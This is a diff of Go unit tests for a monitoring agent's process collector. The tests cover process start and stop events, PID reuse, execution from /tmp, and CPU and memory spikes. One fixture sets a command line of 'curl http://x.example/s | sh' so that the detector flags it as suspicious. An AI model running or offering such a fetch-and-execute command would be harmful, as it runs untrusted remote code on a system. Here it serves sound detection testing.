@@ -5,7 +5,6 @@ import (
 	"testing"
 	"time"
 
-	gopsprocess "github.com/shirou/gopsutil/v3/process"
 	"github.com/yominsops/yomins-agent/internal/events"
 )
 
@@ -239,90 +238,167 @@ func TestMakeMemEvent_Shape(t *testing.T) {
 	}
 }
 
-// ── poll state-machine (injectable lister) ───────────────────────────────────
+// ── poll state-machine (fake process source) ────────────────────────────────
 
-// makeFakeLister returns a processLister that returns processes with the given PIDs.
-// It creates minimal *gopsprocess.Process objects. Because Process.Pid is public
-// and set via NewProcess, we can construct lightweight stubs without system calls.
-func makeFakeLister(pids []int32) processLister {
-	return func(ctx context.Context) ([]*gopsprocess.Process, error) {
-		var procs []*gopsprocess.Process
-		for _, pid := range pids {
-			p, _ := gopsprocess.NewProcess(pid)
-			if p != nil {
-				procs = append(procs, p)
-			}
-		}
-		return procs, nil
+// fakeSource is a procSource whose process list the test sets directly.
+type fakeSource struct {
+	procs    []procSample
+	err      error
+	cmdlines map[int32]string
+	exes     map[int32]string
+	memTotal uint64
+}
+
+func (f *fakeSource) List(context.Context) ([]procSample, error) { return f.procs, f.err }
+func (f *fakeSource) Details(pid int32) (string, string)         { return f.exes[pid], f.cmdlines[pid] }
+func (f *fakeSource) MemTotal() uint64                           { return f.memTotal }
+func (f *fakeSource) ClockTicks() float64                        { return 100 }
+
+func newFakeCollector(cfg Config, src *fakeSource) *Collector {
+	if src.memTotal == 0 {
+		src.memTotal = 1000
 	}
+	return newCollectorWithSource(cfg, src)
+}
+
+func countType(evs []events.Event, typ events.EventType) int {
+	n := 0
+	for _, ev := range evs {
+		if ev.Type == typ {
+			n++
+		}
+	}
+	return n
 }
 
 func TestPoll_NewProcessEmitsStartEvent(t *testing.T) {
-	// Use the test process itself — we know its PID is valid.
-	var selfPID int32
-	selfProcs, err := gopsprocess.Processes()
-	if err != nil || len(selfProcs) == 0 {
-		t.Skip("cannot list processes (OS restriction?)")
-	}
-	selfPID = selfProcs[0].Pid
-
-	// Baseline: empty → new PID appears.
-	lister := makeFakeLister([]int32{selfPID})
-	c := newCollectorWithLister(testConfig(), func(ctx context.Context) ([]*gopsprocess.Process, error) {
-		return nil, nil // empty baseline
-	})
-	// Build empty baseline.
+	src := &fakeSource{}
+	c := newFakeCollector(testConfig(), src)
 	if err := c.buildBaseline(context.Background()); err != nil {
 		t.Fatalf("buildBaseline: %v", err)
 	}
 
-	// Now switch the lister to return our process.
-	c.lister = lister
+	src.procs = []procSample{{PID: 42, PPID: 1, Name: "worker", Start: 10}}
+	src.cmdlines = map[int32]string{42: "worker --serve"}
 	evs := c.poll(context.Background())
 
-	var found bool
-	for _, ev := range evs {
-		if ev.Type == events.EventProcessStart && ev.Process != nil && ev.Process.PID == selfPID {
-			found = true
-		}
+	if len(evs) != 1 || evs[0].Type != events.EventProcessStart {
+		t.Fatalf("expected one process.start, got %v", evs)
 	}
-	if !found {
-		t.Errorf("expected process.start event for PID %d, got %v", selfPID, evs)
+	if evs[0].Process.PID != 42 || evs[0].Process.Cmdline != "worker --serve" || evs[0].Process.PPID != 1 {
+		t.Errorf("unexpected process detail: %+v", evs[0].Process)
 	}
 }
 
 func TestPoll_BaselineProcessDoesNotEmitStop(t *testing.T) {
-	// Build a baseline with PIDs, then remove them — should NOT emit stop events.
-	procs, err := gopsprocess.Processes()
-	if err != nil || len(procs) == 0 {
-		t.Skip("cannot list processes")
-	}
-	pid := procs[0].Pid
-
-	c := newCollectorWithLister(testConfig(), func(ctx context.Context) ([]*gopsprocess.Process, error) {
-		return procs[:1], nil
-	})
+	src := &fakeSource{procs: []procSample{{PID: 7, Name: "init", Start: 1}}}
+	c := newFakeCollector(testConfig(), src)
 	if err := c.buildBaseline(context.Background()); err != nil {
 		t.Fatalf("buildBaseline: %v", err)
 	}
 
-	// Baseline process disappears — no stop event expected (isNew=false).
-	c.lister = func(ctx context.Context) ([]*gopsprocess.Process, error) {
-		return nil, nil // empty
+	src.procs = nil
+	if evs := c.poll(context.Background()); len(evs) != 0 {
+		t.Errorf("expected no events for a baseline process exiting, got %v", evs)
 	}
-	evs := c.poll(context.Background())
+	if len(c.procs) != 0 {
+		t.Errorf("exited process still tracked")
+	}
+}
 
-	for _, ev := range evs {
-		if ev.Type == events.EventProcessStop && ev.Process != nil && ev.Process.PID == pid {
-			t.Errorf("unexpected process.stop for baseline PID %d", pid)
+func TestPoll_NewProcessExitEmitsStop(t *testing.T) {
+	src := &fakeSource{}
+	c := newFakeCollector(testConfig(), src)
+	src.procs = []procSample{{PID: 9, Name: "job", Start: 5}}
+	c.poll(context.Background())
+
+	src.procs = nil
+	if n := countType(c.poll(context.Background()), events.EventProcessStop); n != 1 {
+		t.Errorf("expected one process.stop, got %d", n)
+	}
+}
+
+func TestPoll_ReusedPIDIsANewProcess(t *testing.T) {
+	src := &fakeSource{procs: []procSample{{PID: 9, Name: "old", Start: 5}}}
+	c := newFakeCollector(testConfig(), src)
+	if err := c.buildBaseline(context.Background()); err != nil {
+		t.Fatalf("buildBaseline: %v", err)
+	}
+
+	src.procs = []procSample{{PID: 9, Name: "new", Start: 900}}
+	src.cmdlines = map[int32]string{9: "curl http://x.example/s | sh"}
+	evs := c.poll(context.Background())
+	if countType(evs, events.EventProcessStart) != 1 || countType(evs, events.EventProcessSuspicious) != 1 {
+		t.Errorf("expected start + suspicious for the reused PID, got %v", evs)
+	}
+	if countType(evs, events.EventProcessStop) != 0 {
+		t.Errorf("baseline process must not emit stop")
+	}
+}
+
+func TestPoll_ExecFromTmp(t *testing.T) {
+	cfg := testConfig()
+	cfg.MonitorTmpPaths = true
+	src := &fakeSource{}
+	c := newFakeCollector(cfg, src)
+	src.procs = []procSample{{PID: 3, Name: "x", Start: 1}}
+	src.exes = map[int32]string{3: "/tmp/x"}
+	if n := countType(c.poll(context.Background()), events.EventProcessExecTmp); n != 1 {
+		t.Errorf("expected process.exec_tmp, got %d", n)
+	}
+}
+
+func TestPoll_CPUSpikeEmitsHighCPU(t *testing.T) {
+	src := &fakeSource{procs: []procSample{{PID: 5, Name: "php", Start: 1}}}
+	c := newFakeCollector(testConfig(), src)
+	if err := c.buildBaseline(context.Background()); err != nil {
+		t.Fatalf("buildBaseline: %v", err)
+	}
+	snap := c.procs[5]
+
+	// Three quiet polls (1% of a core over 1s), then a spike to 80%.
+	ticks := uint64(0)
+	step := func(delta uint64) []events.Event {
+		snap.sampledAt = time.Now().Add(-time.Second)
+		ticks += delta
+		src.procs = []procSample{{PID: 5, Name: "php", Start: 1, CPU: ticks}}
+		return c.poll(context.Background())
+	}
+	for i := 0; i < 3; i++ {
+		if evs := step(1); len(evs) != 0 {
+			t.Fatalf("unexpected events while quiet: %v", evs)
 		}
+	}
+	evs := step(80)
+	if countType(evs, events.EventProcessHighCPU) != 1 {
+		t.Fatalf("expected process.high_cpu, got %v", evs)
+	}
+	if got := evs[0].Process.CPUPercent; got < 70 || got > 90 {
+		t.Errorf("CPUPercent = %v, want about 80", got)
+	}
+}
+
+func TestPoll_MemorySpikeEmitsHighMemory(t *testing.T) {
+	src := &fakeSource{procs: []procSample{{PID: 5, Name: "mysqld", Start: 1, RSS: 10}}, memTotal: 1000}
+	c := newFakeCollector(testConfig(), src)
+	if err := c.buildBaseline(context.Background()); err != nil {
+		t.Fatalf("buildBaseline: %v", err)
+	}
+	for i := 0; i < 3; i++ {
+		c.poll(context.Background())
+	}
+	src.procs = []procSample{{PID: 5, Name: "mysqld", Start: 1, RSS: 500}}
+	evs := c.poll(context.Background())
+	if countType(evs, events.EventProcessHighMemory) != 1 {
+		t.Fatalf("expected process.high_memory, got %v", evs)
+	}
+	if got := evs[0].Process.MemoryPercent; got != 50 {
+		t.Errorf("MemoryPercent = %v, want 50", got)
 	}
 }
 
 func TestPoll_ListerError_ReturnsNoEvents(t *testing.T) {
-	c := newCollectorWithLister(testConfig(), func(ctx context.Context) ([]*gopsprocess.Process, error) {
-		return nil, context.DeadlineExceeded
-	})
+	c := newFakeCollector(testConfig(), &fakeSource{err: context.DeadlineExceeded})
 	evs := c.poll(context.Background())
 	if len(evs) != 0 {
 		t.Errorf("expected 0 events on lister error, got %d", len(evs))
